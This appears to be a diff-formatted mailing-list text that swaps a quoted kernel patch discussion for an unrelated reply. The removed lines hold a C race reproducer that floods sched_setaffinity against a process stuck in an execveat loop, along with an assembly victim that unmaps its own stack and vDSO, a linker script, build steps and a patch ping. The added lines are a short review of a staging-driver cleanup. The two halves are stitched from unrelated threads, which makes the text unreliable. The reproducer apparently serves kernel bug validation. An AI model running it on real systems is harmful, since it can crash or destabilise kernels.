-> >               _exit(3);
-> > }
-> >
-> > static int drain_exec_counter(unsigned long long *total)
-> > {
-> >       uint64_t value;
-> >
-> >       for (;;) {
-> >               ssize_t ret =3D read(READY_FD, &value, sizeof(value));
-> >
-> >               if (ret =3D=3D sizeof(value)) {
-> >                       *total +=3D value;
-> >                       continue;
-> >               }
-> >               if (ret < 0 && errno =3D=3D EINTR)
-> >                       continue;
-> >               if (ret < 0 && errno =3D=3D EAGAIN)
-> >                       return 0;
-> >               return -1;
-> >       }
-> > }
-> >
-> > static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
-> > {
-> >       struct pollfd pfd =3D { .fd =3D READY_FD, .events =3D POLLIN };
-> >       int status, ret;
-> >
-> >       do {
-> >               ret =3D poll(&pfd, 1, 5000);
-> >       } while (ret < 0 && errno =3D=3D EINTR);
-> >       if (ret !=3D 1 || !(pfd.revents & POLLIN) ||
-> >           drain_exec_counter(execs) || !*execs)
-> >               return -1;
-> >       ret =3D waitpid(victim, &status, WNOHANG);
-> >       if (ret =3D=3D victim) {
-> >               errno =3D ECHILD;
-> >               return -1;
-> >       }
-> >       return ret < 0 ? -1 : 0;
-> > }
-> >
-> > static void publish_stats(struct setter_stats *stats,
-> >                         unsigned long long attempts,
-> >                         unsigned long long successes,
-> >                         unsigned long long errors)
-> > {
-> >       __atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
-> >       __atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
-> >       __atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
-> > }
-> >
-> > static void run_setter(pid_t victim, int cpu, int victim_a, int victim_=
-b,
-> >                      int index, time_t deadline, struct shared_state *s=
-tate)
-> > {
-> >       cpu_set_t one, two;
-> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
-> >
-> >       prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-> >       pin_self(cpu);
-> >       enable_irq_pressure();
-> >       CPU_ZERO(&one);
-> >       CPU_SET(victim_a, &one);
-> >       CPU_ZERO(&two);
-> >       CPU_SET(victim_a, &two);
-> >       CPU_SET(victim_b, &two);
-> >       while (time(NULL) < deadline) {
-> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), =
-&one))
-> >                       successes++;
-> >               else
-> >                       errors++;
-> >               attempts++;
-> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), =
-&two))
-> >                       successes++;
-> >               else
-> >                       errors++;
-> >               attempts++;
-> >               if (!(attempts & 0x3ff))
-> >                       publish_stats(&state->setters[index], attempts,
-> >                                     successes, errors);
-> >       }
-> >       publish_stats(&state->setters[index], attempts, successes, errors=
-);
-> >       _exit(0);
-> > }
-> >
-> > static void load_totals(struct shared_state *state, int nset,
-> >                       unsigned long long *attempts,
-> >                       unsigned long long *successes,
-> >                       unsigned long long *errors)
-> > {
-> >       int i;
-> >
-> >       *attempts =3D *successes =3D *errors =3D 0;
-> >       for (i =3D 0; i < nset; i++) {
-> >               *attempts +=3D __atomic_load_n(&state->setters[i].attempt=
-s,
-> >                                            __ATOMIC_RELAXED);
-> >               *successes +=3D __atomic_load_n(&state->setters[i].succes=
-ses,
-> >                                             __ATOMIC_RELAXED);
-> >               *errors +=3D __atomic_load_n(&state->setters[i].errors,
-> >                                          __ATOMIC_RELAXED);
-> >       }
-> > }
-> >
-> > static int wait_child(pid_t pid, int *status)
-> > {
-> >       pid_t ret;
-> >
-> >       do {
-> >               ret =3D waitpid(pid, status, 0);
-> >       } while (ret < 0 && errno =3D=3D EINTR);
-> >       return ret =3D=3D pid ? 0 : -1;
-> > }
-> >
-> > int main(int argc, char **argv)
-> > {
-> >       struct shared_state *state;
-> >       pid_t victim, setters[MAX_SETTERS];
-> >       time_t deadline;
-> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
-> >       unsigned long long execs =3D 0, previous_execs, previous_successe=
-s =3D 0;
-> >       int cpus, runtime, victim_a, victim_b, nset, i, status;
-> >       int spawned =3D 0, failed =3D 0;
-> >
-> >       setvbuf(stdout, NULL, _IONBF, 0);
-> >       setvbuf(stderr, NULL, _IONBF, 0);
-> >       cpus =3D (int)sysconf(_SC_NPROCESSORS_ONLN);
-> >       if (cpus < 4) {
-> >               fprintf(stderr, "need at least four online CPUs\n");
-> >               return 1;
-> >       }
-> >       runtime =3D argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
-> >       if (runtime <=3D 0)
-> >               runtime =3D DEFAULT_RUNTIME;
-> >       victim_a =3D cpus - 2;
-> >       victim_b =3D cpus - 1;
-> >       nset =3D victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
-> >       state =3D mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
-> >                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-> >       if (state =3D=3D MAP_FAILED)
-> >               return 1;
-> >       for (i =3D 0; i < MAX_SETTERS; i++)
-> >               setters[i] =3D -1;
-> >       if (install_exec_counter() || install_victim()) {
-> >               perror("install victim");
-> >               return 1;
-> >       }
-> >
-> >       victim =3D fork();
-> >       if (!victim) {
-> >               cpu_set_t pinned;
-> >               char *const av[] =3D { "victim", NULL };
-> >               char *const ev[] =3D { NULL };
-> >
-> >               prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-> >               CPU_ZERO(&pinned);
-> >               CPU_SET(victim_a, &pinned);
-> >               if (sched_setaffinity(0, sizeof(pinned), &pinned))
-> >                       _exit(4);
-> >               syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PAT=
-H);
-> >               _exit(127);
-> >       }
-> >       if (victim < 0)
-> >               return 1;
-> >       if (wait_for_first_exec(victim, &execs)) {
-> >               perror("victim did not begin exec loop");
-> >               failed =3D 1;
-> >               goto cleanup;
-> >       }
-> >       deadline =3D time(NULL) + runtime;
-> >       printf("[*] standalone minimal-exec race: runtime=3D%ds setters=
-=3D%d\n",
-> >              runtime, nset);
-> >       printf("[*] victim starts on cpu%d; setters alternate {%d} and {%=
-d,%d}\n",
-> >              victim_a, victim_a, victim_a, victim_b);
-> >       for (i =3D 0; i < nset; i++) {
-> >               setters[i] =3D fork();
-> >               if (!setters[i])
-> >                       run_setter(victim, i, victim_a, victim_b, i,
-> >                                  deadline, state);
-> >               if (setters[i] < 0) {
-> >                       perror("fork setter");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               spawned++;
-> >       }
-> >       previous_execs =3D execs;
-> >       while (time(NULL) < deadline) {
-> >               struct timespec delay;
-> >               time_t remaining =3D deadline - time(NULL);
-> >               pid_t ret;
-> >
-> >               ret =3D waitpid(victim, &status, WNOHANG);
-> >               if (ret =3D=3D victim) {
-> >                       fprintf(stderr, "victim exited early: status=3D0x=
-%x\n", status);
-> >                       victim =3D -1;
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (ret < 0) {
-> >                       perror("waitpid victim");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               for (i =3D 0; i < spawned; i++) {
-> >                       if (setters[i] < 0)
-> >                               continue;
-> >                       ret =3D waitpid(setters[i], &status, WNOHANG);
-> >                       if (ret =3D=3D setters[i]) {
-> >                               setters[i] =3D -1;
-> >                               if (time(NULL) < deadline || !WIFEXITED(s=
-tatus) ||
-> >                                   WEXITSTATUS(status)) {
-> >                                       fprintf(stderr,
-> >                                               "setter %d exited early: =
-status=3D0x%x\n",
-> >                                               i, status);
-> >                                       failed =3D 1;
-> >                                       goto cleanup;
-> >                               }
-> >                       } else if (ret < 0) {
-> >                               perror("waitpid setter");
-> >                               failed =3D 1;
-> >                               goto cleanup;
-> >                       }
-> >               }
-> >               if (remaining <=3D 0)
-> >                       break;
-> >               delay.tv_sec =3D remaining > 10 ? 10 : remaining;
-> >               delay.tv_nsec =3D 0;
-> >               while (nanosleep(&delay, &delay) && errno =3D=3D EINTR)
-> >                       ;
-> >               if (drain_exec_counter(&execs)) {
-> >                       perror("read exec counter");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               ret =3D waitpid(victim, &status, WNOHANG);
-> >               if (ret =3D=3D victim) {
-> >                       fprintf(stderr, "victim exited early: status=3D0x=
-%x\n", status);
-> >                       victim =3D -1;
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (ret < 0) {
-> >                       perror("waitpid victim");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               load_totals(state, nset, &attempts, &successes, &errors);
-> >               if (execs =3D=3D previous_execs) {
-> >                       fprintf(stderr, "victim made no exec progress in =
-window\n");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (successes =3D=3D previous_successes) {
-> >                       fprintf(stderr,
-> >                               "setters made no successful affinity prog=
-ress in window\n");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               printf("[*] progress: affinity_success=3D%llu attempts=3D=
-%llu "
-> >                      "errors=3D%llu execs=3D%llu\n",
-> >                      successes, attempts, errors, execs);
-> >               previous_execs =3D execs;
-> >               previous_successes =3D successes;
-> >       }
-> >       for (i =3D 0; i < spawned; i++) {
-> >               if (setters[i] < 0)
-> >                       continue;
-> >               if (wait_child(setters[i], &status) || !WIFEXITED(status)=
- ||
-> >                   WEXITSTATUS(status)) {
-> >                       fprintf(stderr, "setter %d failed: status=3D0x%x\=
-n", i, status);
-> >                       failed =3D 1;
-> >               }
-> >               setters[i] =3D -1;
-> >       }
-> >       load_totals(state, nset, &attempts, &successes, &errors);
-> >       if (!attempts || !successes || attempts !=3D successes + errors) =
-{
-> >               fprintf(stderr, "invalid affinity totals\n");
-> >               failed =3D 1;
-> >       }
-> >       if (drain_exec_counter(&execs)) {
-> >               fprintf(stderr, "failed to read final exec progress\n");
-> >               failed =3D 1;
-> >       }
-> >       if (kill(victim, SIGKILL)) {
-> >               perror("kill victim");
-> >               failed =3D 1;
-> >       } else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
-> >                  WTERMSIG(status) !=3D SIGKILL) {
-> >               fprintf(stderr, "unexpected victim status: 0x%x\n", statu=
-s);
-> >               failed =3D 1;
-> >       }
-> >       victim =3D -1;
-> >       if (!failed) {
-> >               printf("[*] validated completion: affinity_success=3D%llu=
- "
-> >                      "attempts=3D%llu errors=3D%llu execs=3D%llu; no KA=
-SAN report\n",
-> >                      successes, attempts, errors, execs);
-> >               return 0;
-> >       }
-> >
-> > cleanup:
-> >       for (i =3D 0; i < spawned; i++) {
-> >               if (setters[i] > 0) {
-> >                       kill(setters[i], SIGKILL);
-> >                       wait_child(setters[i], &status);
-> >               }
-> >       }
-> >       if (victim > 0) {
-> >               kill(victim, SIGKILL);
-> >               wait_child(victim, &status);
-> >       }
-> >       puts("[!] validation failed");
-> >       return 1;
-> > }
-> > ```
-> >
-> > The embedded victim source and linker script follow.
-> >
-> > `victim_min_execfd.S`:
-> >
-> > ```asm
-> >       .section .text
-> >       .global _start
-> >       .type _start,@function
-> > _start:
-> >       mov %rsp, %r12
-> >
-> >       /* Count this instance through the inherited eventfd. */
-> >       mov $1, %eax
-> >       mov $3, %edi
-> >       lea one(%rip), %rsi
-> >       mov $8, %edx
-> >       syscall
-> >       cmp $8, %rax
-> >       jne .Lexit
-> >
-> >       /* Drop the stack and adjacent vDSO/vvar mappings before exec. */
-> >       mov %r12, %rdi
-> >       and $-2097152, %rdi
-> >       mov $4194304, %esi
-> >       mov $11, %eax
-> >       syscall
-> >
-> >       /* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
-> >       mov $322, %eax
-> >       mov $4, %edi
-> >       lea empty(%rip), %rsi
-> >       lea argv(%rip), %rdx
-> >       xor %r10d, %r10d
-> >       mov $0x1000, %r8d
-> >       syscall
-> >
-> > .Lexit:
-> >       mov $60, %eax
-> >       mov $127, %edi
-> >       syscall
-> >       hlt
-> >       .size _start, .-_start
-> >
-> >       .section .data
-> >       .align 8
-> > one:
-> >       .quad 1
-> > empty:
-> >       .byte 0
-> >       .align 8
-> > argv:
-> >       .quad empty
-> >       .quad 0
-> >
-> >       .section .note.GNU-stack,"",@progbits
-> > ```
-> >
-> > `victim_min.ld`:
-> >
-> > ```ld
-> > ENTRY(_start)
-> >
-> > PHDRS
-> > {
-> >       image PT_LOAD FILEHDR PHDRS FLAGS(7);
-> >       stack PT_GNU_STACK FLAGS(6);
-> > }
-> >
-> > SECTIONS
-> > {
-> >       . =3D 0x400000 + SIZEOF_HEADERS;
-> >       .image : ALIGN(16) {
-> >               *(.text*)
-> >               *(.rodata*)
-> >               *(.data*)
-> >               *(.bss*)
-> >       } :image
-> >       /DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
-> > }
-> > ```
-> >
-> > The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:
-> >
-> > ```sh
-> > gcc -c -nostdlib -o victim.o victim_min_execfd.S
-> > ld -nostdlib -T victim_min.ld -o victim victim.o
-> > test "$(stat -c %s victim)" =3D 848
-> > readelf -h -l -S victim
-> > base64 -w 76 victim
-> > ```
-> >
-> >
-> > Thanks,
-> > Weiming
-> >
->
->
-> --
-> Mathieu Desnoyers
-> EfficiOS Inc.
-> https://www.efficios.com
+On Tue, Nov 24, 2026 at 04:45:04PM +0000, Abhishek Chaulagain wrote:
+> The timed controller HAL module - timed_ctrl_snd_commnd(),
+> timed_ctrl_snd_sp_commnd(), timed_ctrl_snd_gpio_commnd() and the inline
+> timed_ctrl_reg_store() helper they used - has no callers anywhere in the
+> tree. The only remaining reference was a stale #include in sh_css.c that
+> pulled in none of its symbols.
+> 
+> Remove the dead source file, its public/private/local/global headers and
+> the timed_controller_defs.h definitions header (included only by this
+> module), drop the object from the Makefile, and delete the unused include
+> from sh_css.c.
+> 
+> With the module gone, the timed_ctrl_ID_t enumeration in system_global.h
+> and the TIMED_CTRL_BASE[] base-address table in system_local.{c,h} have
+> no remaining users, so remove them as well.
+> 
+> No functional change intended.
 
-Hi everyone,
+Good cleanup if it compiles,
+Reviewed-by: Andy Shevchenko <andriy.shevchenko@intel.com>
 
-Just a gentle ping on this v3 patch. Any thoughts, feedback, or review comm=
-ents?
+-- 
+With Best Regards,
+Andy Shevchenko
 
-Thanks,
-Weiming
+
